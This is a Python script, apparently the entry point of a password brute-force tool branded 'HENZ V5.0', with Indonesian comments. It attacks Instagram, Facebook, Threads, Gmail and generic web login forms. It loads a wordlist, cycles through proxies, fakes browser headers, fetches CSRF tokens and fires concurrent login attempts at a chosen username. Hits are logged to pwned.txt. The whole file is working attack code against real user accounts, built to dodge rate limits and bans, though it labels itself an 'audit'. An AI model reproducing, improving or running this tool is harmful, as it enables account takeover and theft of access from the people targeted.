import asyncio
import os
import signal
from colorama import Fore, init
import httpx

from core.proxy_mgr import ProxyManager
from core.engine import JarvisEngine
from core.headers import HeaderGenerator

# Import Modul Terpisah (Pastikan modul ini ada)
from targets import instagram, facebook, threads, gmail, web_mail_auth, web_user_auth

init(autoreset=True)

BANNER = f"""
{Fore.RED}██╗  ██╗███████╗███╗   ██╗███████╗
██║  ██║██╔════╝████╗  ██║╚══███╔╝
███████║█████╗  ██╔██╗ ██║  ███╔╝ 
██╔══██║██╔══╝  ██║╚██╗██║ ███╔╝  
██║  ██║███████╗██║ ╚████║███████╗
╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝
{Fore.WHITE}[ V5.0 - STEALTH ARCHITECTURE UPGRADE ]
"""

# Konfigurasi Global
MAX_CONCURRENCY = 20  # Batas thread bersamaan agar tidak RTO/Ban

async def attack_worker(semaphore, engine, client, url, target_user, password, target_module):
    async with semaphore:
        headers = HeaderGenerator.get_headers(target_module.get_config().get('platform', 'web_generic'))
        payload = target_module.get_payload(target_user, password)
        
        # Eksekusi serangan
        res = await engine.execute_audit(client, url, payload, headers)
        
        # Analisis Response
        if res:
            if res.status_code == 200 or res.status_code == 302:
                # Cek keyword gagal spesifik (harus disesuaikan per target)
                if "incorrect" not in res.text.lower() and "salah" not in res.text.lower() and "error" not in res.text.lower():
                    print(f"{Fore.GREEN}[PWNED] {target_user}:{password} | Status: {res.status_code}")
                    with open("pwned.txt", "a") as f: f.write(f"{target_user}:{password}\n")
                    return True # Stop jika ketemu (opsional)
                else:
                    print(f"{Fore.RED}[FAIL] {password} (Content Reject)")
            else:
                print(f"{Fore.YELLOW}[STATUS {res.status_code}] {password}")
        else:
            print(f"{Fore.BLACK}[ERR] Connection Timeout/Refused")
        return False

async def start_audit():
    print(BANNER)
    
    # 1. SETUP PROXY
    proxies = []
    if os.path.exists("proxies.txt"):
        with open("proxies.txt", "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
    
    pm = ProxyManager(proxies)
    engine = JarvisEngine(pm)

    # 2. SELECT TARGET (Simplified for fix demonstration)
    print(f"{Fore.CYAN}TARGET SELECTION:")
    print("1. Instagram\n2. Facebook\n3. Threads\n4. Gmail\n5. Web (Email)\n6. Web (User)")
    choice = input(f"{Fore.GREEN}>> Input [1-6]: ")
    
    modules = {'1': instagram, '2': facebook, '3': threads, '4': gmail, '5': web_mail_auth, '6': web_user_auth}
    target_module = modules.get(choice)
    if not target_module: return print("Invalid Choice.")

    # 3. LOAD WORDLIST
    target_user = input(f"\n{Fore.YELLOW}[TARGET] Username/Email: ")
    wordlist_file = "pass.txt" # Default atau tambah logika input file
    
    try:
        with open(wordlist_file, "r", encoding="utf-8", errors='ignore') as f:
            passwords = [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        return print(f"[!] {wordlist_file} not found.")

    print(f"\n{Fore.RED}[*] STARTING STEALTH ATTACK ON: {target_user}")
    print(f"[*] Threads: {MAX_CONCURRENCY} (Semaphore Locked)\n")

    # 4. EXECUTION WITH SEMAPHORE & SESSION REUSE
    config = target_module.get_config()
    semaphore = asyncio.Semaphore(MAX_CONCURRENCY)
    
    # Setup Proxy string untuk Client
    current_proxy = pm.get_proxy() # Mengambil 1 proxy untuk session ini (rotasi per request butuh logika beda)
    
    async with httpx.AsyncClient(proxies=current_proxy, http2=True, verify=False, timeout=20) as client:
        # Pre-Attack: Fetch Token jika modul support (Implementasi nanti di target)
        if hasattr(target_module, 'pre_attack'):
            print(f"{Fore.BLUE}[*] Fetching CSRF/Security Tokens...")
            await target_module.pre_attack(client, target_user)

        tasks = []
        for pwd in passwords:
            task = asyncio.create_task(
                attack_worker(semaphore, engine, client, config['url'], target_user, pwd, target_module)
            )
            tasks.append(task)
        
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(start_audit())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] ABORTED BY USER")
